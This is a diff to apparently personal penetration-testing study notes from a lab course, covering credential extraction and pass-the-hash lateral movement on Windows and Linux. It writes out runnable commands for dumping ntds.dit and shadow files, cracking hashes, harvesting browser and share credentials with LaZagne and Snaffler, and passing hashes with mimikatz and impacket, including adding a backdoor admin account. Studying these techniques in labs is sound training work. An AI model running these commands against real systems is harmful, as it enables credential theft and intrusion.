@@ -97,7 +97,7 @@ https://www.softwaretestinghelp.com/default-router-username-and-password-list/
 pip3 install defaultcreds-cheat-sheet  //install 
 creds search cisco  //search  
 
-**Extracting Passwords from Windows Systems**:  
+## Extracting Passwords from Windows Systems:  
 LSASS: Local Security authoriry subsystem service: authenticates users, manages local logins, users to SID   
 SAM(Security account manager) database: stores LM or NTLM hashes, C:\system32\SAM, system priv  
 AD database of creds: %SystemRoot%\ntds.dit  
@@ -157,7 +157,7 @@ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
 Capturing NTDS.dit - NT Directory services . dit directory information tree - primary DB file stored everything  
 stored at %systemroot%/ntds on the domain controllers It is very likely that NTDS will be stored on C:  
 the compromised account has domian admin rights which we can use to copy ntds.dit  
-can use vssadmin to do a volume shadow copy, copy volume c 
+can use vssadmin to do a volume shadow copy, copy volume c  
 we can;t directly copy the ntds.dit due to mandatory file lock hence create a show of volume and then copy it from the shadow copy  
 
 evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'  
@@ -173,6 +173,90 @@ Once hashes dumped, can use hashcat to crack the NT hashes
 sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt  
 If no crack then pass the hashes using evil-winrm or netexec  
 evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b  
+
+**Credential Hunting in Windows**:  
+Once we have access to a target Windows machine through the GUI or CLI  
+Gui/cli search for keyword password  
+C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml  
+LaZagne -- tool to discover creds stored in browser and other apps such as chats, mails, memory, wifi, 
+C:\Users\bob\Desktop> start LaZagne.exe all  //good to keep a copy, copy paste with xfreerdp  
+Other places -- Group policies in Sysvol, IT shares, web.config, unattend.xMl, AD description fields, keepass database, files  
+
+## Extracting Passwords from Linux Systems  
+**Linux Authentication process**  
+PAM - pluggable authentication modules - commonly used authentication mechanism  
+/etc/passwd -- user list their homedir default-shell userid, group id  
+htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash  
+/etc/shadow -- password hashes -- if no x in /etc/passwd -- then no password, if /etc/passwd is writable then remove x  
+If the Password field contains a character such as ! or *, the user cannot log in using a Unix password.  
+However, other authentication methods—such as Kerberos or key-based authentication—can still be used  
+The PAM library (pam_unix.so) can prevent users from reusing old passwords.  
+These previous passwords are stored in the /etc/security/opasswd file  - need privilege check to see the patterns  
+
+Cracking Linux Credentials  -- once we have priv can copy shadow file and crack pass  
+we can use a tool called unshadow, which is included with John the Ripper (JtR).  
+It works by combining the passwd and shadow files into a single file suitable for cracking.  
+sudo cp /etc/passwd /tmp/passwd.bak  
+$ sudo cp /etc/shadow /tmp/shadow.bak  
+$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes  
+hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked  
+john --single hash.txt  ''john single attack mode, include eVerything starting with username to end  martin:\$6\$0  
+
+**Credential Hunting in Linux**  
+covered in linux privesc -- use the scripts in teddy  
+check files, scripts, ssh keys, cronjobs, notes, databases, config files, history files, log files  
+Memory and cache -- use mimipenguin  - requires priv - gets creds stored in browser, in memory or in files  
+LaZagne -- for browser,aws, sessions, browsers, wifi, cli etc  
+sudo python2.7 laZagne.py all  
+Browser credentials -- Browsers store the passwords saved by the user in an encrypted form locally on the system to be reused.  
+Firefox Decrypt -- can be used to decrypt creds in logins.json of firefox  
+python3.9 firefox_decrypt.py  
+LaZagne can also return same creds -- no priv required  
+python3 laZagne.py browsers  
+presense of .mozilla in users home directory is a hint  
+/home/soda/.mozilla/firefox/ytb95ytb.default-release/logins.json  
+
+## Extracting Passwords from the Network  
+**Credential Hunting in Network Traffic**  
+Cleartext services -- http, ftp, snmp, pop3, imap, smtp, ldap etc  
+Using wireshark -- search query http contains "passw"  
+Using Pcredz -- to extract creds from live traffic or network packet captures  
+./Pcredz -f demo.pcapng -t -v  
+
+**Credential Hunting in Network Shares**  
+Snaffler - windows - run on a domain joined machine, automatically searches for interesting files  
+c:\Users\Public>Snaffler.exe -s  //basic search  
+PowerHuntShares --- powershell - doesn't necessarily need domain joined machine, it generates html report  
+PS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public  
+
+Linux...
+Manspider - allow us to scan SMB shares from Linux  
+docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'  
+Crackmapexec -- nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"  
+
+## Windows Lateral Movement Techniques  
+**Pass the Hash(PtH)** :  
+From Windows: using mimikatz, powershell  
+mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+
+PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1  
+PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark  Password123 /add && net localgroup administrators mark /add" -Verbose  
+
+From Linux: impacket, netexec, evilwinrm, xfreerdp  
+impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453  
+netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453  
+netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami  //command execution  
+evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453  
+
+RDP PtH possible only if restricted admin mode disabled by default is enabled on target otherwise error account restrictions preventing  
+c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f  
+xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B  
+
+UAC Limits pass the hash for local accounts(UAC restrictions on local accounts for local accounts, however this restriction doesn't apply if user is part of local admin group and is a domain user)  
+UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key   HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy is set to 0,  
+it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks.  
+Setting it to 1 allows the other local admins as well.  
+
 
 
 
